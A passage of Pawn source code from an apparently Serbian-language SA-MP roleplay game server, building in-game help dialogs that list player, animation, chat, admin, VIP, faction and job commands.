			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Uopsteno:",
			        																				"{4282C0}>> /levelup: {FFFFFF}Sama komanda kaze.\n\
			        																				{4282C0}>> /settings: {FFFFFF}Postavke.\n\
			        																				{4282C0}>> /upgrade: {FFFFFF}Koriscenje upgrade-a.\n\
			        																				{4282C0}>> /pay: {FFFFFF}Placanje.\n\
			        																				{4282C0}>> /statistika: {FFFFFF}Statistika servera.\n\
			        																				{4282C0}>> /stats: {FFFFFF}Tvoja statistika.\n\
			        																				{4282C0}>> /report: {FFFFFF}Prijava igraca koji krsi pravila.\n\
			        																				{4282C0}>> /askq: {FFFFFF}Pitanje za administraciju.\n\
			        																				{4282C0}>> /new: {FFFFFF}Trazenje pomoci ako ste novi na serveru.\n\
			        																				{4282C0}>> /refresh: {FFFFFF}Osvjezavanje ako se zabagovali.\n\
			        																				{4282C0}>> /accept: {FFFFFF}Prihvatanje ponudjenih stvari.\n\
			        																				{4282C0}>> /cancel: {FFFFFF}Opozit od /accept, znaci odbijanje.\n\
			        																				{4282C0}>> /(mp3)music: {FFFFFF}24/7 radio stanice.\n\
			        																				{4282C0}>> /napusti(t)dm: {FFFFFF}Izlazak iz (T)DM Zone(igraonice).\n\
			        																				{4282C0}>> /(p)pickup: {FFFFFF}Javljanje na telefon.\n\
			        																				{4282C0}>> /(h)hangup: {FFFFFF}Prekidanje poziva.\n\
			        																				{4282C0}>> /uzmicigaretu: {FFFFFF}Pusenje cigare.\n\
			        																				{4282C0}>> /bail: {FFFFFF}Placanje kaucije.\n\
			        																				{4282C0}>> /trazi: {FFFFFF}Pretrazivanje kontejnera.\n\
			        																				{4282C0}>> /exit: {FFFFFF}Izlazak iz vozila.\n\
			        																				{4282C0}>> /ad: {FFFFFF}Davanje oglasa.\n\
			        																				{4282C0}>> /smsad: {FFFFFF}Davanje SMS oglasa.\n\
			        																				{4282C0}>> /lek: {FFFFFF}Koriscenje lijeka.\n\
			        																				{4282C0}>> /time: {FFFFFF}Gledanje na sat.\n\
			        																				{4282C0}>> /bacisat: {FFFFFF}Bacanje rucnog sata.\n\
			        																				{4282C0}>> /mask(on|off): {FFFFFF}Stavljanje/skidanje maske na lice.\n\
			        																				{4282C0}>> /(pokazi)dozvole: {FFFFFF}Gledanje/prikazivanje vasih dozvola.\n\
			        																				{4282C0}>> /(pickup|drop)gun: {FFFFFF}Podizanje/bacanje oruzja sa/na pod/a.\n\
			        																				{4282C0}>> /lideri: {FFFFFF}Lideri na serveru.\n\
			        																				{4282C0}>> /rukovanje: {FFFFFF}Rukovanje sa igracom.\n\
			        																				{4282C0}>> /eject: {FFFFFF}Izbacivanje igraca iz vozila.\n\
			        																				{4282C0}>> /give: {FFFFFF}Davanje stvari.\n\
			        																				{4282C0}>> /tog: {FFFFFF}Paljenje/gasenje stvari.\n\
			        																				{4282C0}>> /unrent: {FFFFFF}Unrent vozila.\n\
			        																				{4282C0}>> /gps(off): {FFFFFF}Koriscenje i gasenje GPS-a.\n\
			        																				{4282C0}>> /razbijlisice: {FFFFFF}Razbijanje lisica.\n\
			        																				{4282C0}>> /upoeni: {FFFFFF}Koriscenje Ultimate Poena.\n\
			        																				{4282C0}>> /firework: {FFFFFF}Aktivirate vatromet.\n\
			        																				{4282C0}>> /top: {FFFFFF}Top lista.", "Zatvori", "");
			    }
				case 1:
			    {
			        //Animacije
				    ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Animacije:",
				    																				"{FFFFFF}** {4282C0}Komanda: {FFFFFF}/anim [naziv]\n\n\
				    																				bj(1/4) | sexy(1/8) | aswat(1/9) | gang(1/7) | bat(1/5) | ghand(1/5) | gsign(1/5) | caract(1/7)\n\
				    																				thankyou | carsmoke | angry | greet | eatsit | slapped | wankoff | checkout | wank | scratch\n\
				    																				invite(1/2) | win(1/2) | giver(1/2) | pull | getup | kick | liftup | putdown | joint | die(1/2)\n\
				    																				shakehead | camera | cockgun | yes | face(1/6) | endchat(1/3) | show | bed(1/4) | shout(1/3)\n\
				    																				look(1/4) | flag | handsup | drunk(1/3) | bomb(1/2) | laugh | lookout(1/3) | robman(1/2) | eat\n\
				    																				crossarms(1/2) | lay(1/8) | hide(1/2) | vomit | wave(1/5) | slap(1/2) | deal(1/2) | dance(1/4)\n\
				    																				crack(1/5) | smoke(1/6) | chat(1/3) | hike(1/3) | fuck(1/2) | taichi | sit(1/6) | salute | piss\n\
				    																				fall(1/2) | kiss(1/9) | injured(1/5) | sup(1/3) | rap(1/5) | push(1/2) | spray | medic | bar(1/2)\n\
				    																				tired(1/2) | box | cop(1/7) | stance(1/13) | basket(1/4) | walk(1/14) | lean(1/3) | strip(1/7)\n\
				    																				celebrate | handsup | misc(1/3) ||| stop (DA PREKINETE ANIMACIJU)\n\n\
				    																				* Ukoliko zelite tipa KISS kucate /anim kiss:broj, primjer: /anim kiss3 | /anim kiss5 | itd i za ostale...", "Zatvori", "");
			    }
				case 2:
			    {
			        //Chat
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Chat:",
																								"{FFFFFF}** {4282C0}Chat:\n\n\
																								{4282C0}>> /b: {FFFFFF}OOC chat - radius 15m.\n\
																								{4282C0}>> /c: {FFFFFF}Close/blizinski/tihi chat - radius 3m.\n\
																								{4282C0}>> /s: {FFFFFF}Shout/glasno/deranje chat - radius 35m.\n\
																								{4282C0}>> /w: {FFFFFF}Whisper/saputanje chat.\n\
																								{4282C0}>> /me: {FFFFFF}RolePlay iskazivanje radnje.\n\
																								{4282C0}>> /do: {FFFFFF}RolePlay opis radnje sa mogucim upitom.\n\
																								{4282C0}>> /attempt: {FFFFFF}RolePlay radnja sa pokusajom.", "Zatvori", "");
			    }
				case 3:
			    {
			        //Admin
			        if( PlayerInfo[ playerid ][ xAdmin ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

				    new DialogStrgEx1[4000];
					if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}ADMIN - 1:\n{FFFFFF}");
				        strcat( DialogStrgEx1, "/aduty /a /o(oc) /veh /cc /reklama /spec /specoff /(fv)fixveh /fvp /slap /goto /gethere /pm /spavnuj /apark /lp /kick /zatvoreni /(r)oglaswarn\n");
						strcat( DialogStrgEx1, "/(pp)punishplayer /jail /freeze /unfreeze /utisani /pweapons /port /aupali /trazeni /warn /altchat /vipwarn /pustimuziku /sethp /kill /rtc /rac\n");
						strcat( DialogStrgEx1, "/nick /mute /jetpack /rtcveh /proveri /pip /afklista /novajlije /ban /afirework /fasttune /askin /odbrojavanje /rtcradius\n");
						strcat( DialogStrgEx1, "/eucitaj /eugasi /ekazi /eucesnici /getcar /apravila /rb /rrb /rrball\n\n");
					}
					if( PlayerInfo[ playerid ][ xAdmin ] >= 2 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}ADMIN - 2:\n{FFFFFF}");
						strcat( DialogStrgEx1, "/prison /offprison /offjail /setjob /offmute /unmute\n\n");
					}
					if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}ADMIN - 3:\n{FFFFFF}");
				       	strcat( DialogStrgEx1, "/banip /vremenskiban /disarm /ekreiraj /eunisti /setint /setvw /ainvite /ukloniradio /mark /gotomark /multiacc /tog /skloniblokade\n");
				       	strcat( DialogStrgEx1, "/gotocar /setarmor /tod /vreme /rvipwarn\n\n");
					}
					if( PlayerInfo[ playerid ][ xAdmin ] >= 4 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}ADMIN - 4:\n{FFFFFF}");
				       	strcat( DialogStrgEx1, "/startgift /stopgift /proverarada /(r)blacklist /sretniid\n\n");
					}
					if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}HEAD ADMIN:\n{FFFFFF}");
				  		strcat( DialogStrgEx1, "/makeleader /healall /armorall /freezeall /unfreezeall /auninvite /ogetcar /checkpp /resetrob /fine /makespecadmin /offban /unjail /unprison\n");
						strcat( DialogStrgEx1, "/smenilidera /allmembers /aoffuninvite /givegun /askiniorgkaznu /proverikaznu /aclearwl /unbanip /multiips /setskin /unban /entercar /adresa\n\n");
						strcat( DialogStrgEx1, "/vratistats /makepromoter /smenipromotera\n\n");
					}
					if( PlayerInfo[ playerid ][ xAdmin ] >= 6 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}DIREKTOR:\n{FFFFFF}");
					    strcat( DialogStrgEx1, "/promenipol /oport /aktivnostigraca /muteall /gethereall /unwarn /razvedi /dajdrogu /dodajfakture /edit /startpaket /smenispecadmina /(opv)offplayerveh\n");
						strcat( DialogStrgEx1, "/veh /unmuteall /setjob /dboja /proveriimovinu /maknisastatsa /adajdozvolu /neaktivnost /playerrich /servername /checkbusiness /deleteoffveh /deleteacc\n\n");
					}
					if( PlayerInfo[ playerid ][ xAdmin ] >= 7 )
					{
				        strcat( DialogStrgEx1, "{FFFFFF}** {4282C0}VLASNIK:\n{FFFFFF}");
					    strcat( DialogStrgEx1, "/server /dajsvima /maintenancemode /kickall /makevip /changename /giveurank /1 /lockserver /xgoto /resetstaffstats /setstat /donatorskeboje /pomerilokaciju\n");
						strcat( DialogStrgEx1, "/dodajslotvozila /skinislotvozila /hidenames /shownames /proverisqlidigraca /sklonisaaukcije /listavozila /smenigamemastera /smenivipa /aktivirajpoklone\n");
						strcat( DialogStrgEx1, "/smeniadmina /makeadmin /givemoney /makegamemaster /changeadmincode /(pv)playervehicles /aukcije /prodajsaaukcije /vratistats /offvratistats");
					}
					ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Admin Komande:", DialogStrgEx1, "OK", "" );
			    }
				case 4:
			    {
			        //Spec Admin
			        if( PlayerInfo[ playerid ][ xSpecAdmin ] < 1 ) return SendErrorMessage(playerid, "Niste ovlasceni.");
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Spec Admin:",
																								"{FFFFFF}** {4282C0}Spec Admin:\n\n\
																								{4282C0}>> /specduty: {FFFFFF}Admin duznost.\n\
																								{4282C0}>> /veh: {FFFFFF}Admin vozilo.\n\
																								{4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																								{4282C0}>> /ga: {FFFFFF}SA/GM chat.\n\
																								{4282C0}>> /cc: {FFFFFF}Ciscenje chata.\n\
																								{4282C0}>> /reklama: {FFFFFF}Reklama za forum/ts3.\n\
																								{4282C0}>> /spec(off): {FFFFFF}Paljenje i gasenje speca.\n\
																								{4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																								{4282C0}>> /(vr)fvp: {FFFFFF}Popravljanje vozila igracu.\n\
																								{4282C0}>> /slap: {FFFFFF}Samar igracu.\n\
																								{4282C0}>> /goto: {FFFFFF}Portanje do igraca.\n\
																								{4282C0}>> /gethere: {FFFFFF}Portanje igraca do vas.\n\
																								{4282C0}>> /(pp)punishplayer: {FFFFFF}Punish/kazna igracu.\n\
																								{4282C0}>> /kick: {FFFFFF}Kickanje igraca.\n\
																								{4282C0}>> /kill: {FFFFFF}Ubijanje igraca.\n\
																								{4282C0}>> /altchat: {FFFFFF}Gasenje/Paljenje alt chata.\n\
																								{4282C0}>> /rtc: {FFFFFF}Respawn vozila u kom se nalazite.\n\
																								{4282C0}>> /nick: {FFFFFF}Kickanje igraca zbog nonRP nicka.\n\
																								{4282C0}>> /count: {FFFFFF}Odbrajavanje.\n\
																								{4282C0}>> /fasttune: {FFFFFF}Brzi tuning.\n\
																								{4282C0}>> /spavnuj: {FFFFFF}Spawnovanje igraca.\n\
																								{4282C0}>> /pm: {FFFFFF}Privatna poruka.\n\
																								{4282C0}>> /(r)oglaswarn: {FFFFFF}Davanje/skidanje oglas-warna.\n\
																								{4282C0}>> /sethp: {FFFFFF}Postavljanje HPa.\n\
																								{4282C0}>> /rtcradius: {FFFFFF}Respawn vozila u odredjenom radiusu.\n\
																								{4282C0}>> /trazeni: {FFFFFF}Pokazuje sve igrace koji imaju WL.", "Zatvori", "");
			    }
				case 5:
			    {
			        //Helper
				    if( PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
					{
			        	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

				        strcat( DialogStrgEx, "{FFFFFF}** {48E86B}GAMEMASTER 1:\n{FFFFFF}");
				        strcat( DialogStrgEx, "/gmduty /g /ga /veh /reklama /lp /goto /port /slap /rtc /fasttune\n");
						strcat( DialogStrgEx, "/playercc /(fv)fixveh /(vr)fvp /pm\n\n");

				        if( PlayerInfo[ playerid ][ xGamemaster ] >= 2 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
						{
						    strcat( DialogStrgEx, "{FFFFFF}** {48E86B}GAMEMASTER 2:\n{FFFFFF}");
				        	strcat( DialogStrgEx, "/gethere /jetpack /jail /kill /kick /sethp\n\n");
						}

						ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Gamemaster Komande:", DialogStrgEx, "OK", "" );

						strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				    }
					else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
			    }
				case 6:
			    {
			        //VIP
			        if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 )
					{
				        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

				        strcat( DialogStrgEx, "{FFFFFF}* Ako ste VIP veci od 1 imate komande i manjih levela VIPa.\n\n");

				        strcat( DialogStrgEx, "{FFFFFF}** {4282C0}VIP 1:\n{FFFFFF}");
				       	strcat( DialogStrgEx, "/vipveh /g /goto /port /vipmenu /rtc(veh)\n\n");

				        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 2 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
						{
				        	strcat( DialogStrgEx, "{FFFFFF}** {4282C0}VIP 2:\n{FFFFFF}");
				        	strcat( DialogStrgEx, "/playercc /vipovi /vipskin\n");
				        	strcat( DialogStrgEx, "Vise dozvola za lokacije na /port i vise oruzja na /vipmenu.\n\n");
				        }

				        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 3 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
						{
				        	strcat( DialogStrgEx, "{FFFFFF}** {4282C0}VIP 3:\n{FFFFFF}");
				        	strcat( DialogStrgEx, "/tunecar /mark /gotomark\n");
				        	strcat( DialogStrgEx, "Zastita od cooldown-a za oglas.\n");
				        	strcat( DialogStrgEx, "Zastita od BikeBunnyHop-a.\n");
				        	strcat( DialogStrgEx, "Vise dozvola za lokacije na /port i vise oruzja na /vipmenu.\n\n");
						}

				        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
						{
				        	strcat( DialogStrgEx, "{FFFFFF}** {4282C0}VIP 4:\n{FFFFFF}");
				        	strcat( DialogStrgEx, "/(fv)fixveh /getcar /gotofirma\n");
				        	strcat( DialogStrgEx, "Zastita od Bunny Hopa i steceni interes 0.4\n");
				        	strcat( DialogStrgEx, "Vise dozvola za lokacije na /port i vise oruzja na /vipmenu.\n\n");
						}

				        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
						{
				        	strcat( DialogStrgEx, "{FFFFFF}** {4282C0}VIP 5:\n{FFFFFF}");
				        	strcat( DialogStrgEx, "/nitro /vbingo /fasttune\n");
				        	strcat( DialogStrgEx, "Dupli respekt na paydayu i full hp/armor spawn.\n");
				        	strcat( DialogStrgEx, "Steceni interes 0.5\n");
				        	strcat( DialogStrgEx, "Vise dozvola za lokacije na /port i vise oruzja na /vipmenu.\n\n");
						}

				        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 6 || PlayerInfo[ playerid ][ xAdmin ] >= 6 )
						{
				        	strcat( DialogStrgEx, "{FFFFFF}** {4282C0}VIP 6:\n{FFFFFF}");
				        	strcat( DialogStrgEx, "/vvreme /vtod\n");
				        	strcat( DialogStrgEx, "Imuni ste na policijsku komandu /take(oduzimanje).\n");
				        	strcat( DialogStrgEx, "Unikatna boja imena i steceni interes 0.6\n");
				        	strcat( DialogStrgEx, "Nema cooldown na /port i /vveh.");
						}

						ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - VIP:", DialogStrgEx, "OK", "" );
				    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				    }
					else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
			    }
				case 7:
			    {
			        //Vodja lidera
			        if( PlayerInfo[ playerid ][ xSkriptaRank ] != 4 ) return SendErrorMessage(playerid, "Niste ovlasceni.");
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Vodja lidera:",
																								"{FFFFFF}** {4282C0}Vodja lidera:\n\n\
																								{4282C0}>> /makeleader: {FFFFFF}Postavljanje lidera.\n\
																								{4282C0}>> /smenilidera: {FFFFFF}Skidanje offline lidera.\n\
																								{4282C0}>> /allmembers: {FFFFFF}Svi clanovi organizacije.\n\
																								{4282C0}>> /aoffuninvite: {FFFFFF}Izbacivanje offline igraca iz organizacije.\n\
																								{4282C0}>> /skiniorgkaznu: {FFFFFF}Skidanje org kazne.\n\
																								{4282C0}>> /auninvite: {FFFFFF}Izbacivanje igraca iz organizacije.", "Zatvori", "");
			    }
				case 8:
			    {
			        //Lider
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Lider:",
																								"{FFFFFF}** {4282C0}Lider:\n\n\
																								{4282C0}>> /lider: {FFFFFF}Lider menu.\n\
																								{4282C0}>> /l: {FFFFFF}Lider chat.", "Zatvori", "");
			    }
				case 9:
			    {
			        //Organizacija
			        switch(GetFactionType( playerid ))
			        {
			        	case ORG_TIP_VLADINA:
						{
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Organizacija:",
																								"{FFFFFF}** {4282C0}Organizacija - Vladina:\n\n\
																								{4282C0}>> /orghelp: {FFFFFF}Sve policijske komande.\n\
																								{4282C0}>> /organizacija: {FFFFFF}Organizacija menu.\n\
																								{4282C0}>> /f: {FFFFFF}Family chat.\n\
																								{4282C0}>> /d: {FFFFFF}Vladine orge chat.\n\
																								{4282C0}>> /r: {FFFFFF}Radio izmedu organizacije.\n\
																								{4282C0}>> /members: {FFFFFF}Online clanovi.\n\
																								{4282C0}>> /zatvorenici: {FFFFFF}Svi online zatvorenici.\n\
																								{4282C0}>> /napustiorg: {FFFFFF}Napustanje organizacije.\n\
																								{4282C0}>> /duty: {FFFFFF}Uzimanje i skidanje duznosti.\n\
																								{4282C0}>> /alcotest: {FFFFFF}Provjera promila u krvi.\n\
																								{4282C0}>> /computer: {FFFFFF}Policijski kompjuter.\n\
																								{4282C0}>> /arrest: {FFFFFF}Hapsenje osumnjicenog.\n\
																								{4282C0}>> /(un)cuff: {FFFFFF}Stavljanje i skidanje lisica.\n\
																								{4282C0}>> /pu: {FFFFFF}Ubacivanje vezanog u vozilo.\n\
																								{4282C0}>> /cctv: {FFFFFF}Nadgledanje CCTV kamera.\n\
																								{4282C0}>> /ugasikamere: {FFFFFF}Gasenje nadgledanja CCTV kamera.\n\
																								{4282C0}>> /tazer: {FFFFFF}Uzimanje i vracanje tazera.\n\
																								{4282C0}>> /m: {FFFFFF}Megafon.\n\
																								{4282C0}>> /wanted: {FFFFFF}Wanted lista.\n\
																								{4282C0}>> /su: {FFFFFF}Davanje wanteda.\n\
																								{4282C0}>> /rb: {FFFFFF}Kreiranje roadblock-a.\n\
																								{4282C0}>> /rrb: {FFFFFF}Uklanjanje roadblock-a.\n\
																								{4282C0}>> /rrball: {FFFFFF}Uklanjanje svih roadblock-ova.\n\
																								{4282C0}>> /bk: {FFFFFF}Pozivanje backup-a.\n\
																								{4282C0}>> /bkc: {FFFFFF}Gasenje poziva backup-a.\n\
																								{4282C0}>> /govrepair: {FFFFFF}Popravljanje gov vozila.\n\
																								{4282C0}>> /undercover: {FFFFFF}Undercover oprema.\n\
																								{4282C0}>> /pdslap: {FFFFFF}Izbacivanje iz vozila.\n\
																								{4282C0}>> /ram: {FFFFFF}Upad u organizacije, imovinu...\n\
																								{4282C0}>> /frisk: {FFFFFF}Pretres igraca.\n\
																								{4282C0}>> /take: {FFFFFF}Uzimanje od igraca.\n\
																								{4282C0}>> /ticket: {FFFFFF}Tiketi za brzu voznju, pijano stanje i ostalo.\n\
																								{4282C0}>> /orgstats: {FFFFFF}Vasa statistika.\n\
																								{4282C0}>> /siren: {FFFFFF}Postavljanje sirene na vozilo.\n\
																								{4282C0}>> /gov: {FFFFFF}Gov obavjestenje.\n\
																								{4282C0}>> /pokaziznacku: {FFFFFF}Pokazivanje znacke.\n\
																								{4282C0}>> /clear: {FFFFFF}Skidanje wanteda.\n\
																								{4282C0}>> /suspend: {FFFFFF}Suspendovanje clana.\n\
																								{4282C0}>> /mandescription: {FFFFFF}Davanje opisa osumnjicenog.\n\
																								{4282C0}>> /removearm: {FFFFFF}Skidanje stita.\n\
																								{4282C0}>> /(eq)uipment: {FFFFFF}Oprema.\n\
																								{4282C0}>> /vuci: {FFFFFF}Vucenje igraca {FF0000}(MORATE CUCNUTI (TIPKA: C) I VUCI INACE NON-RP!!!).\n\
																								{4282C0}>> /pusti: {FFFFFF}Pustanje igraca kog vucete.\n\
																								{4282C0}>> /proveripojas: {FFFFFF}Provjera pojasa vozacu.\n\
																								{4282C0}>> /destroygun: {FFFFFF}Unistavanje bacenog oruzja.\n\
																								{4282C0}>> /carsign: {FFFFFF}Postavljanje oznake na vozilo.\n\
																								{4282C0}>> /govattachs: {FFFFFF}Postavljanje odjece na sebe.", "Zatvori", "");
						}
			        	case ORG_TIP_BANDA:
						{
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Organizacija:",
																								"{FFFFFF}** {4282C0}Organizacija - Banda:\n\n\
																								{4282C0}>> /organizacija: {FFFFFF}Organizacija menu.\n\
																								{4282C0}>> /f: {FFFFFF}Family chat.\n\
																								{4282C0}>> /zauzmifirmu: {FFFFFF}Zauzimanje firme tj. reket.\n\
																								{4282C0}>> /svercdroge: {FFFFFF}Pokretanje sverca droge.\n\
																								{4282C0}>> /prekinisverc: {FFFFFF}Prekidanje sverca droge.\n\
																								{4282C0}>> /members: {FFFFFF}Online clanovi.\n\
																								{4282C0}>> /napustiorg: {FFFFFF}Napustanje organizacije.", "Zatvori", "");
						}
			        	case ORG_TIP_MAFIJA:
						{
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Organizacija:",
																								"{FFFFFF}** {4282C0}Organizacija - Mafija:\n\n\
																								{4282C0}>> /organizacija: {FFFFFF}Organizacija menu.\n\
																								{4282C0}>> /f: {FFFFFF}Family chat.\n\
																								{4282C0}>> /zauzmifirmu: {FFFFFF}Zauzimanje firme tj. reket.\n\
																								{4282C0}>> /svercmatsa: {FFFFFF}Pokretanje sverca matsa.\n\
																								{4282C0}>> /prekinisverc: {FFFFFF}Prekidanje sverca matsa.\n\
																								{4282C0}>> /members: {FFFFFF}Online clanovi.\n\
																								{4282C0}>> /napustiorg: {FFFFFF}Napustanje organizacije.", "Zatvori", "");
						}
						case ORG_TIP_BAJKERI:
						{
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Organizacija:",
																								"{FFFFFF}** {4282C0}Organizacija - Bajkeri:\n\n\
																								{4282C0}>> /organizacija: {FFFFFF}Organizacija menu.\n\
																								{4282C0}>> /f: {FFFFFF}Family chat.\n\
																								{4282C0}>> /members: {FFFFFF}Online clanovi.\n\
																								{4282C0}>> /napustiorg: {FFFFFF}Napustanje organizacije.", "Zatvori", "");
						}
						case ORG_TIP_HITMAN:
						{
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Organizacija:",
																								"{FFFFFF}** {4282C0}Organizacija - Hitman:\n\n\
																								{4282C0}>> /organizacija: {FFFFFF}Organizacija menu.\n\
																								{4282C0}>> /f: {FFFFFF}Family chat.\n\
																								{4282C0}>> /portable: {FFFFFF}Hitman menu.\n\
																								{4282C0}>> /members: {FFFFFF}Online clanovi.\n\
																								{4282C0}>> /napustiorg: {FFFFFF}Napustanje organizacije.", "Zatvori", "");
						}
			        	default:
						{
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Organizacija:",
																								"{FFFFFF}** {4282C0}Organizacija - Unknown?\n\n\
																								{4282C0}>> /organizacija: {FFFFFF}Organizacija menu.\n\
																								{4282C0}>> /f: {FFFFFF}Family chat.\n\
																								{4282C0}>> /members: {FFFFFF}Online clanovi.\n\
																								{4282C0}>> /napustiorg: {FFFFFF}Napustanje organizacije.", "Zatvori", "");
						}
					}
			    }
				case 10:
			    {
			        //Savez
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Savez:",
																								"{FFFFFF}** {4282C0}Savez:\n\n\
																								{4282C0}>> /savez: {FFFFFF}Spajanje saveza.\n\
																								{4282C0}>> /prekinisavez: {FFFFFF}Prekidanje saveza.\n\
																								{4282C0}>> /sa: {FFFFFF}Savez chat.\n\
																								{4282C0}>> /savezi: {FFFFFF}Lista saveza.", "Zatvori", "");
			    }
				case 11:
			    {
			        //Posao
			        switch(PlayerInfo[ playerid ][ xPosao ])
			        {
			            case POSAO_MEHANICAR:
			            {
			                ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Mehanicar:\n\n\
																								{4282C0}>> /mechanic duty: {FFFFFF}Mehanicarska oprema.\n\
																								{4282C0}>> /mechanic job: {FFFFFF}Pokretanje posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza.", "Zatvori", "");
			            }
			            case POSAO_PMUNICIJE:
			            {
			                ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Proizvodjac Municije:\n\n\
																								{4282C0}>> /posao: {FFFFFF}Pokretanje posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /uniforma: {FFFFFF}Uzimanje i ostavljanje uniforme posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza", "Zatvori", "");
			            }
			            case POSAO_PILOT:
			            {
			                ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Pilot:\n\n\
																								{4282C0}>> /posao: {FFFFFF}Pokretanje posla.\n\
																								{4282C0}>> /uniforma: {FFFFFF}Uzimanje i ostavljanje uniforme posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza", "Zatvori", "");
			            }
			            case POSAO_RUDAR:
			            {
			                ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Rudar:\n\n\
																								{4282C0}>> /posao: {FFFFFF}Pokretanje posla.\n\
																								{4282C0}>> /uniforma: {FFFFFF}Uzimanje i ostavljanje uniforme posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza", "Zatvori", "");
			            }
			            case POSAO_PNOVCA:
			            {
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Prevoznik novca:\n\n\
																								{4282C0}>> /posao: {FFFFFF}Pokretanje posla.\n\
																								{4282C0}>> /uniforma: {FFFFFF}Uzimanje i ostavljanje uniforme posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza", "Zatvori", "");
			            }
			            case POSAO_UBERDRIVER: {
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Uber:\n\n\
																								{4282C0}>> /posao: {FFFFFF}Pokretanje posla.\n\
																								{4282C0}>> /uniforma: {FFFFFF}Uzimanje i ostavljanje uniforme posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza", "Zatvori", "");
			            }
			            case POSAO_PNAMJESTAJA: {
							ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Posao:",
																								"{FFFFFF}** {4282C0}Posao - Proizvodjac Namjestaja:\n\n\
																								{4282C0}>> /posao: {FFFFFF}Pokretanje posla.\n\
